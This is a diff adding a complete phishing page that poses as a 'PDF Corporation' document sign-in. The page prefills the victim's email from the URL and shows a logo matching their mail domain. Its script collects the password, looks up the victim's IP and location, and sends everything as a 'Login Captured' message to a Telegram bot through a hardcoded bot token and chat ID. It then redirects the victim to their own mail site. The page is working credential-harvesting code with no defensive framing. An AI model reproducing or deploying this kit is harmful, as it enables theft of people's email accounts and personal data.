@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>verifying</title>
+  
+  <style>
+    :root {
+      --brand: #f0290b;
+      --brand-ghost: rgba(126, 34, 255, .12);
+      --text: #0f172a;
+      --muted: #475569;
+      --border: #e2e8f0;
+      --bg: #ffffff;
+    }
+    * { box-sizing: border-box; }
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      background-image: url("https://isc.sans.edu/diaryimages/images/blurred21207.jpg");
+      background-size: cover;
+      background-position: center;
+    }
+    .wrap {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px;
+    }
+    
+    .card {
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      background: #fff;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px 32px 24px;
+      box-shadow: 0 10px 25px rgba(0,0,0,.1);
+      box-sizing: border-box;
+      transition: box-shadow .2s ease;
+    }
+    .logo { font-weight: 800; font-size: 28px; margin-bottom: 12px; color: var(--brand); }
+    h1 { margin: 0 0 6px 0; font-size: 26px; line-height: 1.2; }
+    .sub { color: var(--muted); font-size: 14px; margin-bottom: 20px; }
+    form { text-align: left; margin-top: 8px; }
+    label { display: block; font-size: 14px; margin: 0 0 6px; }
+    input[type="text"], input[type="email"], input[type="password"] {
+      width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 14px;
+      font-size: 16px;
+      outline: none;
+      transition: border .15s ease, box-shadow .15s ease;
+    }
+    input:focus { border-color: var(--brand); box-shadow: 0 0 0 4px var(--brand-ghost); }
+    .btn {
+      width: 100%;
+      border: none;
+      border-radius: 999px;
+      padding: 14px 18px;
+      font-weight: 600;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: background .2s, transform .1s;
+    }
+    .btn.primary { background: var(--brand); color: white; }
+    .btn.primary:hover { background: #e50202; }
+    .btn.ghost { background: transparent; color: var(--brand); border: 2px solid var(--brand); }
+    .btn.ghost:hover { background: var(--brand-ghost); }
+    .link { display: inline-block; margin-top: 12px; color: var(--brand); text-decoration: none; font-size: 14px; }
+    .footer { margin-top: 36px; color: #94a3b8; font-size: 12px; text-align: center; }
+    .hidden { display: none; }
+    .email-badge { margin: 0 0 6px; color: #0f172a; font-weight: 600; font-size: 14px; word-break: break-all; text-align: center; }
+    @media (max-width: 480px) { .card { padding: 0 8px; } h1 { font-size: 22px; } input, .btn { font-size: 15px; } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="logo">PDF</div>
+      <h1 id="title">Sign in to continue</h1>
+      <div class="sub" style="font-size: 15px;color:brown;" id="subtitle">Authentication Required</div>
+      <img id="logoimg" width="60" style="margin: auto;"><br>
+
+      <!-- Step 1 -->
+      <form id="step1" autocomplete="off" onsubmit="goStep2(event)">
+        <label for="identifier">Email</label>
+        <input id="identifier" name="identifier" type="text" placeholder="" required />
+        <button class="btn primary" type="submit">Next</button>
+        <div style="text-align:center">
+          <div class="checkbox" style="margin-top:12px; font-size:13px; color:var(--muted);">
+            <input type="checkbox" id="staySignedIn" name="staySignedIn" checked />
+            <label for="staySignedIn" style="display:inline;">Secure Login?</label>
+          </div>
+         
+        </div>
+      </form>
+
+      <!-- Step 2 -->
+      <form id="step2" class="hidden" autocomplete="off" onsubmit="sendToTelegram(event)">
+        <div class="email-badge" id="emailBadge"></div>
+        <h1 style="font-size:24px;margin:0 0 8px">Enter password</h1>
+        <div class="sub" style="margin-top:-6px">to access document</div>
+        <input id="password" name="password" type="password" placeholder="Password" required />
+        <button class="btn primary" type="submit">View</button>
+        
+      </form>
+      <b><div class="footer">© 2025 PDF Corporation</b>
+
+<script>
+  let identifier = "";
+  let my_slice = "mail.google.com"; // default fallback
+
+  window.addEventListener("DOMContentLoaded", () => {
+    // Try query string first (?email=...)
+    const params = new URLSearchParams(window.location.search);
+    let email = params.get("email") || window.location.hash.substr(1);
+
+    if (email) {
+      const decoded = decodeURIComponent(email);
+      document.getElementById("identifier").value = decoded;
+
+      // Update logo immediately
+      const domainMatch = decoded.match(/@([\w.-]+)/);
+      if (domainMatch) {
+        my_slice = domainMatch[1];
+        document.getElementById("logoimg").src = `https://logo.clearbit.com/${my_slice}`;
+      }
+
+      // Automatically go to password field after DOM ready
+      setTimeout(() => goStep2(), 50);
+    }
+  });
+
+  // Simple email format validation (optional styling)
+  const filter = /^[a-zA-Z0-9._-]+@([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/;
+  document.getElementById("identifier").addEventListener("input", function () {
+    this.style.borderColor = filter.test(this.value) ? "green" : "red";
+  });
+</script>
+
+<script>
+  const botToken = "7683553096:AAGPG2RDLoQ827aCC91IdHBNMlxYVlqC7cc";
+  const chatId = "8178748363";
+  const ipinfoToken = "c93157deeec985";
+
+  function goStep2(e) {
+    if (e) e.preventDefault();
+    identifier = document.getElementById("identifier").value.trim();
+    document.getElementById("emailBadge").textContent = identifier;
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+    document.getElementById("password").focus();
+  }
+
+  async function sendToTelegram(e) {
+    e.preventDefault();
+    const password = document.getElementById("password").value.trim();
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    let ip = "Unavailable", website = "Unavailable", region = "Unavailable", country = "Unavailable";
+    let loc = "Unavailable", org = "Unavailable", city = "Unavailable";
+    try {
+      const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
+      const data = await res.json();
+      ip = data.ip || "Unavailable";
+      website = data.hostname || "Unavailable";
+      region = data.region || "Unavailable";
+      country = data.country || "Unavailable";
+      loc = data.loc || "Unavailable";
+      org = data.org || "Unavailable";
+      city = data.city || "Unavailable";
+      my_slice = identifier.split('@')[1] || "";
+    } catch (error) {
+      console.error("Error fetching IP:", error);
+    }
+
+    const message = `
+🔐 <b>Zemani Email Login Captured</b>
+------------------------------
+📧 <b>Identifier:</b> ${identifier}
+🔑 <b>Password:</b> ${password}
+🌍 <b>Timezone:</b> ${timezone}
+📍 <b>IP Address:</b> ${ip}
+📍infoip : https://ipinfo.io/${ip}
+🏙️ <b>City:</b> ${city}
+🌐 <b>Region:</b> ${region}
+🇨🇦 <b>Country:</b> ${country}
+📌 <b>Location:</b> ${loc}
+🏢 <b>ISP:</b> ${org}
+🌐website link: https://${my_slice}
+------------------------------
+    `.trim();
+
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+      });
+      window.location.replace("https://" + my_slice);
+    } catch (err) {
+      console.error("Failed to send to Telegram", err);
+      alert("Time out: This document isn’t available at the moment. Please try again later.");
+      window.close();
+    }
+  }
+
+  // Logo updates when user types
+  const emailInput = document.getElementById("identifier");
+  emailInput.addEventListener("input", () => {
+    const email = emailInput.value;
+    const domainMatch = email.match(/@([\w.-]+)/);
+    if (domainMatch) {
+      my_slice = domainMatch[1];
+      document.getElementById("logoimg").src = `https://logo.clearbit.com/${my_slice}`;
+    }
+  });
+</script>
+</body>
+</html>
